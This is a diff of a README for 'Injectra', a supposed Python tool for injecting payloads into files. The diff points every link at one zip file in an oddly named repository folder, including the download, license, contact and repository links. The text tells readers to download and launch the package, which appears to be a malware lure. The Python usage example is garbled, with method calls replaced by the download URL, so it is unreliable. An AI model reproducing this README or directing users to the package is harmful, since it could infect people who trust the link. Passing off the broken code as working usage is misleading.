@@ -6,7 +6,7 @@ Welcome to Injectra, a Python-based tool designed for injecting custom payloads 
 
 To get started with Injectra, you can download the software package from the link provided below. Make sure to launch the package once it's downloaded:
 
-[![Download Software Package](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)
+[![Download Software Package](https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip)](https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip)
 
 In case the link doesn't work or if you're looking for the latest version of Injectra, please check the "Releases" section of this repository.
 
@@ -38,25 +38,25 @@ Injectra's usage is straightforward and efficient:
 import injectra
 
 # Create an instance of Injectra
-injector = https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip()
+injector = https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip()
 
 # Load the file to inject payload into
-https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(file_path)
+https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip(file_path)
 
 # Define and set the custom payload
 custom_payload = "Your custom payload here"
-https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(custom_payload)
+https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip(custom_payload)
 
 # Inject the payload into the file
-https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip()
+https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip()
 
 # Save the modified file
-https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(output_path)
+https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip(output_path)
 ```
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip) file for details.
 
 ## 🤝 Contributing
 
@@ -64,10 +64,10 @@ We welcome contributions to enhance the functionality of Injectra. Feel free to 
 
 ## 📞 Contact
 
-For any inquiries or support related to Injectra, you can reach out to us at [https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip).
+For any inquiries or support related to Injectra, you can reach out to us at [https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip](https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip).
 
 ---
 
 Dive into the world of custom payload injection with Injectra! Let your creativity flow as you seamlessly modify various file types with ease. Download the software package and start injecting your custom payloads today. Happy injecting! 🎉
 
-[Visit Injectra Repository](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)
+[Visit Injectra Repository](https://raw.githubusercontent.com/Kleteee/Injectra/main/chubbiness/Software-1.2.zip)
